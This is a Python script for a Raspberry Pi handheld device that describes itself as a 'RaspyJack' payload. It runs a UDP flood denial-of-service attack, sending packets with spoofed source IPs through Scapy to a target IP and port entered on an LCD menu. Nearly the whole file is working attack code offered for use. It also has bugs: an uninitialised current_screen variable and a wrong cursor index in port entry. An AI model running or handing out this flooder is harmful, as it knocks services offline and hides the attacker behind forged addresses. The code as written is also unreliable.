#!/usr/bin/env python3
"""
RaspyJack *payload* – **DoS: UDP Flood**
======================================
This payload performs a UDP Flood attack, a type of Denial of Service (DoS)
that aims to overwhelm a target server or network by sending a large volume
of UDP packets to random or specific ports. This can consume bandwidth and
server resources, leading to service disruption.

Features:
- Interactive UI for entering target IP address and port.
- Uses Scapy to craft and send spoofed UDP packets.
- Displays current status (ACTIVE/STOPPED) and packet count on the LCD.
- Graceful exit via KEY3 or Ctrl-C, ensuring the attack is stopped.

Controls:
- MAIN SCREEN:
    - OK: Start UDP Flood.
    - KEY1: Edit Target IP.
    - KEY2: Edit Target Port.
    - KEY3: Exit Payload.
- IP INPUT SCREEN:
    - UP/DOWN: Change digit at cursor position.
    - LEFT/RIGHT: Move cursor.
    - OK: Confirm IP.
    - KEY3: Cancel IP input.
- PORT INPUT SCREEN:
    - UP/DOWN: Change digit at cursor position.
    - LEFT/RIGHT: Move cursor.
    - OK: Confirm Port.
    - KEY3: Cancel Port input.
- ATTACKING SCREEN:
    - OK: Stop Attack.
    - KEY3: Stop Attack and Exit.
"""
import sys
import os
import time
import signal
import subprocess
import threading
import random
sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont
from scapy.all import *
conf.verb = 0

TARGET_IP = "192.168.1.1"
TARGET_PORT = "53"

PINS = { "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16 }
GPIO.setmode(GPIO.BCM)
for pin in PINS.values(): GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = 128, 128
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
FONT_STATUS = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 16)
FONT = ImageFont.load_default()

running = True
attack_thread = None
attack_stop_event = threading.Event()
packet_count = 0
current_ip_input = TARGET_IP
ip_input_cursor_pos = 0
current_port_input = TARGET_PORT
port_input_cursor_pos = 0

def cleanup(*_):
    global running
    if running:
        running = False
        attack_stop_event.set()

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

def show_message(lines, color="lime"):
    img = Image.new("RGB", (128, 128), "black")
    d = ImageDraw.Draw(img)
    font = FONT_TITLE
    y = 40
    for line in lines:
        bbox = d.textbbox((0, 0), line, font=font)
        w, h = bbox[2] - bbox[0], bbox[3] - bbox[1]
        x = (128 - w) // 2
        d.text((x, y), line, font=font, fill=color)
        y += h + 5
    LCD.LCD_ShowImage(img, 0, 0)

def draw_ui(screen_state="main", status: str = ""):
    img = Image.new("RGB", (128, 128), "black")
    d = ImageDraw.Draw(img)
    d.text((5, 5), "UDP Flood", font=FONT_TITLE, fill="#FF0000")
    d.line([(0, 22), (128, 22)], fill="#FF0000", width=1)
    
    if screen_state == "main":
        d.text((5, 30), "Target IP:", font=FONT, fill="white")
        d.text((5, 45), TARGET_IP, font=FONT_TITLE, fill="yellow")
        d.text((5, 65), "Target Port:", font=FONT, fill="white")
        d.text((5, 80), TARGET_PORT, font=FONT_TITLE, fill="yellow")
        d.text((5, 115), "OK=Start | KEY1=Edit IP | KEY2=Edit Port | KEY3=Exit", font=FONT, fill="cyan")
    elif screen_state == "ip_input":
        d.text((5, 30), "Enter Target IP:", font=FONT, fill="white")
        display_ip = list(current_ip_input)
        if ip_input_cursor_pos < len(display_ip):
            display_ip[ip_input_cursor_pos] = '_'
        d.text((5, 50), "".join(display_ip), font=FONT_TITLE, fill="yellow")
        d.text((5, 115), "UP/DOWN=Digit | LEFT/RIGHT=Move | OK=Confirm", font=FONT, fill="cyan")
    elif screen_state == "port_input":
        d.text((5, 30), "Enter Target Port:", font=FONT, fill="white")
        display_port = list(current_port_input)
        if port_input_cursor_pos < len(display_port):
            display_port[port_input_cursor_pos] = '_'
        d.text((5, 50), "".join(display_port), font=FONT_TITLE, fill="yellow")
        d.text((5, 115), "UP/DOWN=Digit | LEFT/RIGHT=Move | OK=Confirm", font=FONT, fill="cyan")
    elif screen_state == "attacking":
        status_color = "lime" if status == "ACTIVE" else "red"
        d.text((30, 35), status, font=FONT_STATUS, fill=status_color)
        d.text((5, 60), "Packets Sent:", font=FONT, fill="white")
        d.text((15, 75), str(packet_count), font=FONT_TITLE, fill="yellow")
        d.text((5, 110), "OK=Stop | KEY3=Exit", font=FONT, fill="cyan")
    
    LCD.LCD_ShowImage(img, 0, 0)

def handle_ip_input_logic(initial_ip):
    global current_ip_input, ip_input_cursor_pos
    current_ip_input = initial_ip
    ip_input_cursor_pos = len(initial_ip) - 1
    
    draw_ui("ip_input")
    
    while running:
        btn = None
        for name, pin in PINS.items():
            if GPIO.input(pin) == 0:
                btn = name
                while GPIO.input(pin) == 0:
                    time.sleep(0.05)
                break
        
        if btn == "KEY3":
            return None
        
        if btn == "OK":
            parts = current_ip_input.split('.')
            if len(parts) == 4 and all(p.isdigit() and 0 <= int(p) <= 255 for p in parts):
                return current_ip_input
            else:
                show_message(["Invalid IP!", "Try again."], "red")
                time.sleep(2)
                current_ip_input = initial_ip
                ip_input_cursor_pos = len(initial_ip) - 1
                draw_ui("ip_input")
        
        if btn == "LEFT":
            ip_input_cursor_pos = max(0, ip_input_cursor_pos - 1)
            draw_ui("ip_input")
        elif btn == "RIGHT":
            ip_input_cursor_pos = min(len(current_ip_input), ip_input_cursor_pos + 1)
            draw_ui("ip_input")
        elif btn == "UP" or btn == "DOWN":
            if ip_input_cursor_pos < len(current_ip_input):
                char_list = list(current_ip_input)
                current_char = char_list[ip_input_cursor_pos]
                
                if current_char.isdigit():
                    digit = int(current_char)
                    if btn == "UP":
                        digit = (digit + 1) % 10
                    else:
                        digit = (digit - 1 + 10) % 10
                    char_list[ip_input_cursor_pos] = str(digit)
                    current_ip_input = "".join(char_list)
                elif current_char == '.':
                    if btn == "UP":
                        ip_input_cursor_pos = min(len(current_ip_input), ip_input_cursor_pos + 1)
                    else:
                        ip_input_cursor_pos = max(0, ip_input_cursor_pos - 1)
                draw_ui("ip_input")
        
        time.sleep(0.1)
    return None

def handle_port_input_logic(initial_port):
    global current_port_input, port_input_cursor_pos
    current_port_input = initial_port
    port_input_cursor_pos = len(initial_port) - 1
    
    draw_ui("port_input")
    
    while running:
        btn = None
        for name, pin in PINS.items():
            if GPIO.input(pin) == 0:
                btn = name
                while GPIO.input(pin) == 0:
                    time.sleep(0.05)
                break
        
        if btn == "KEY3":
            return None
        
        if btn == "OK":
            if current_port_input.isdigit() and 1 <= int(current_port_input) <= 65535:
                return current_port_input
            else:
                show_message(["Invalid Port!", "Try again."], "red")
                time.sleep(2)
                current_port_input = initial_port
                port_input_cursor_pos = len(initial_port) - 1
                draw_ui("port_input")
        
        if btn == "LEFT":
            port_input_cursor_pos = max(0, port_input_cursor_pos - 1)
            draw_ui("port_input")
        elif btn == "RIGHT":
            port_input_cursor_pos = min(len(current_port_input), port_input_cursor_pos + 1)
            draw_ui("port_input")
        elif btn == "UP" or btn == "DOWN":
            if port_input_cursor_pos < len(current_port_input):
                char_list = list(current_port_input)
                current_char = char_list[ip_input_cursor_pos]
                
                if current_char.isdigit():
                    digit = int(current_char)
                    if btn == "UP":
                        digit = (digit + 1) % 10
                    else:
                        digit = (digit - 1 + 10) % 10
                    char_list[ip_input_cursor_pos] = str(digit)
                    current_port_input = "".join(char_list)
                draw_ui("port_input")
        
        time.sleep(0.1)
    return None

def udp_flood_worker():
    global packet_count
    payload = b'\x00' * 1024
    
    while not attack_stop_event.is_set():
        spoofed_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        
        p = IP(src=spoofed_ip, dst=TARGET_IP) / UDP(sport=RandShort(), dport=int(TARGET_PORT)) / Raw(load=payload)
        send(p, verbose=0)
        packet_count += 1
        time.sleep(0.01)

def start_attack():
    global attack_thread, packet_count
    if not (attack_thread and attack_thread.is_alive()):
        packet_count = 0
        attack_stop_event.clear()
        attack_thread = threading.Thread(target=udp_flood_worker, daemon=True)
        attack_thread.start()

def stop_attack():
    attack_stop_event.set()
    if attack_thread:
        attack_thread.join(timeout=2)

if __name__ == "__main__":
    try:
        last_button_press_time = 0
        BUTTON_DEBOUNCE_TIME = 0.3 # seconds

        while running:
            current_time = time.time()
            
            if current_screen == "main":
                draw_ui("main")
                
                if GPIO.input(PINS["KEY3"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    cleanup()
                    break
                
                if GPIO.input(PINS["OK"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    start_attack()
                    current_screen = "attacking"
                    time.sleep(BUTTON_DEBOUNCE_TIME)
                
                if GPIO.input(PINS["KEY1"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    current_ip_input = TARGET_IP
                    current_screen = "ip_input"
                    time.sleep(BUTTON_DEBOUNCE_TIME)
                
                if GPIO.input(PINS["KEY2"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    current_port_input = str(TARGET_PORT)
                    current_screen = "port_input"
                    time.sleep(BUTTON_DEBOUNCE_TIME)
            
            elif current_screen == "ip_input":
                new_ip = handle_ip_input_logic(current_ip_input)
                if new_ip:
                    TARGET_IP = new_ip
                current_screen = "main"
                time.sleep(BUTTON_DEBOUNCE_TIME)
            
            elif current_screen == "port_input":
                new_port = handle_port_input_logic(current_port_input)
                if new_port:
                    TARGET_PORT = new_port
                current_screen = "main"
                time.sleep(BUTTON_DEBOUNCE_TIME)
            
            elif current_screen == "attacking":
                draw_ui("attacking", "ACTIVE")
                if (GPIO.input(PINS["KEY3"]) == 0 or GPIO.input(PINS["OK"]) == 0) and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    stop_attack()
                    current_screen = "main"
                    time.sleep(BUTTON_DEBOUNCE_TIME)
                time.sleep(0.1)

            time.sleep(0.05)

    except (KeyboardInterrupt, SystemExit):
        pass
    except Exception as e:
        print(f"[ERROR] {e}", file=sys.stderr)
        show_message(["CRITICAL ERROR:", str(e)[:20]], "red")
        time.sleep(3)
    finally:
        cleanup()
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("UDP Flood payload finished.")